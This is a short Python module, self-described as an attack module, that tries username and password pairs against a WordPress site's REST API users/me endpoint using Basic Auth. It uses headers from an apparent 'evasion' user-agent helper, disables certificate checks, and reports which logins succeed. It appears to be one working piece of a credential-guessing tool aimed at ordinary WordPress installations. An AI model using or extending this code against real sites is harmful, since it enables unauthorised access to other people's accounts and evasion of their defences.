"""REST API Basic Auth attack module"""
import base64
import requests
from evasion.useragent import get_headers


class RestApiAttack:
    def __init__(self, url, timeout=15):
        self.url = f"{url.rstrip('/')}/wp-json/wp/v2/users/me"
        self.timeout = timeout

    def try_login(self, username, password):
        """Try login via REST API Basic Auth"""
        creds = base64.b64encode(f"{username}:{password}".encode()).decode()
        try:
            resp = requests.get(
                self.url,
                headers=get_headers({"Authorization": f"Basic {creds}"}),
                timeout=self.timeout,
                verify=False
            )
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if data.get("id"):
                        return True
                except Exception:
                    pass
            return False
        except Exception:
            return None
